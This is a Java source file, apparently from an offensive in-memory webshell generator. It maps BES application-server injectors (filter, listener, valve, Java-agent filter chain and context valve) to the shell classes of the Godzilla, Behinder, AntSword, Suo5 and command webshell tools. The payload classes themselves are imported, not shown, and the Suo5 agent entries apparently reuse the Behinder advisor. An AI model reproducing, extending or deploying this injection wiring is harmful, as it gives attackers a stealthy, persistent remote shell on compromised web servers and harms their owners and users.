package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.bes.injector.*;
import com.reajason.javaweb.memshell.generator.ListenerGenerator;
import com.reajason.javaweb.memshell.generator.ValveGenerator;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/26
 */
public class BesShell extends AbstractShell {

    @Override
    protected InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(FILTER, BesFilterInjector.class)
                .addInjector(LISTENER, BesListenerInjector.class)
                .addInjector(VALVE, BesValveInjector.class)
                .addInjector(AGENT_FILTER_CHAIN, BesFilterChainAgentInjector.class)
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, BesContextValveAgentInjector.class)
                .build();
    }

    @Override
    protected void init() {
        addToolMapping(ShellTool.Command, ToolMapping.builder()
                .addShellClass(FILTER, CommandFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Command))
                .addShellClass(VALVE, ValveGenerator.generateValveClass(ValveGenerator.BES_VALVE_PACKAGE, ShellTool.Command))
                .addShellClass(AGENT_FILTER_CHAIN, CommandFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, CommandFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.Godzilla, ToolMapping.builder()
                .addShellClass(FILTER, GodzillaFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Godzilla))
                .addShellClass(VALVE, ValveGenerator.generateValveClass(ValveGenerator.BES_VALVE_PACKAGE, ShellTool.Godzilla))
                .addShellClass(AGENT_FILTER_CHAIN, GodzillaFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, GodzillaFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.Behinder, ToolMapping.builder()
                .addShellClass(FILTER, BehinderFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Behinder))
                .addShellClass(VALVE, ValveGenerator.generateValveClass(ValveGenerator.BES_VALVE_PACKAGE, ShellTool.Behinder))
                .addShellClass(AGENT_FILTER_CHAIN, BehinderFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, BehinderFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.Suo5, ToolMapping.builder()
                .addShellClass(FILTER, Suo5Filter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Suo5))
                .addShellClass(VALVE, ValveGenerator.generateValveClass(ValveGenerator.BES_VALVE_PACKAGE, ShellTool.Suo5))
                .addShellClass(AGENT_FILTER_CHAIN, BehinderFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, BehinderFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.AntSword, ToolMapping.builder()
                .addShellClass(FILTER, AntSwordFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.AntSword))
                .addShellClass(VALVE, ValveGenerator.generateValveClass(ValveGenerator.BES_VALVE_PACKAGE, ShellTool.AntSword))
                .addShellClass(AGENT_FILTER_CHAIN, AntSwordFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, AntSwordFilterChainAdvisor.class)
                .build());
    }
}
